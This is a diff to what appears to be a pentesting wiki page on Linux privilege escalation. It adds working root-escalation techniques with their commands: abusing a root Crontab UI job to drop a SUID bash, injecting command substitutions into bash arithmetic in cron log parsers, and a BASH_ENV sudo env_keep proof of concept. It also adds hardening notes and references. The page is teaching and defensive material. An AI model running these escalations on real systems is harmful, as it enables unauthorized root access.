@@ -83,7 +83,7 @@ You can check if the sudo version is vulnerable using this grep.
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 
-#### sudo < v1.28
+#### sudo < v1.8.28
 
 From @sickrov
 
@@ -376,6 +376,39 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 
 ## Scheduled/Cron jobs
 
+### Crontab UI (alseambusher) running as root – web-based scheduler privesc
+
+If a web “Crontab UI” panel (alseambusher/crontab-ui) runs as root and is only bound to loopback, you can still reach it via SSH local port-forwarding and create a privileged job to escalate.
+
+Typical chain
+- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
+- Find credentials in operational artifacts:
+  - Backups/scripts with `zip -P <password>`
+  - systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
+- Tunnel and login:
+```bash
+ssh -L 9001:localhost:8000 user@target
+# browse http://localhost:9001 and authenticate
+```
+- Create a high-priv job and run immediately (drops SUID shell):
+```bash
+# Name: escalate
+# Command:
+cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
+```
+- Use it:
+```bash
+/tmp/rootshell -p   # root shell
+```
+
+Hardening
+- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
+- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
+- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
+- Enable audit/logging for on-demand job executions
+
+
+
 Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
 
 ```bash
@@ -415,6 +448,30 @@ Read the following page for more wildcard exploitation tricks:
 {{#ref}}
 wildcards-spare-tricks.md
 {{#endref}}
+
+
+### Bash arithmetic expansion injection in cron log parsers
+
+Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.
+
+- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.
+
+- Typical vulnerable pattern:
+  ```bash
+  #!/bin/bash
+  # Example: parse a log and "sum" a count field coming from the log
+  while IFS=',' read -r ts user count rest; do
+      # count is untrusted if the log is attacker-controlled
+      (( total += count ))     # or: let "n=$count"
+  done < /var/www/app/log/application.log
+  ```
+
+- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
+  ```bash
+  # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
+  $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
+  # When the root cron parser evaluates (( total += count )), your command runs as root.
+  ```
 
 ### Cron script overwriting and symlink
 
@@ -861,6 +918,33 @@ This example, **based on HTB machine Admirer**, was **vulnerable** to **PYTHONPA
 ```bash
 sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
 ```
+
+### BASH_ENV preserved via sudo env_keep → root shell
+
+If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.
+
+- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.
+
+- Requirements:
+  - A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
+  - `BASH_ENV` present in `env_keep` (check with `sudo -l`).
+
+- PoC:
+
+```bash
+cat > /dev/shm/shell.sh <<'EOF'
+#!/bin/bash
+/bin/bash
+EOF
+chmod +x /dev/shm/shell.sh
+BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
+# You should now have a root shell
+```
+
+- Hardening:
+  - Remove `BASH_ENV` (and `ENV`) from `env_keep`, prefer `env_reset`.
+  - Avoid shell wrappers for sudo-allowed commands; use minimal binaries.
+  - Consider sudo I/O logging and alerting when preserved env vars are used.
 
 ### Sudo execution bypassing paths
 
@@ -1639,6 +1723,16 @@ Android rooting frameworks commonly hook a syscall to expose privileged kernel f
 android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 {{#endref}}
 
+## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)
+
+Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).
+
+Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:
+
+{{#ref}}
+vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
+{{#endref}}
+
 ## Kernel Security Protections
 
 - [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
@@ -1665,6 +1759,10 @@ android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 
 ## References
 
+- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
+- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
+
+
 - [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 - [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
 - [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
@@ -1682,6 +1780,11 @@ android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 - [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
+- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
+- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
+- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
 
+- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
 
 {{#include ../../banners/hacktricks-training.md}}
+
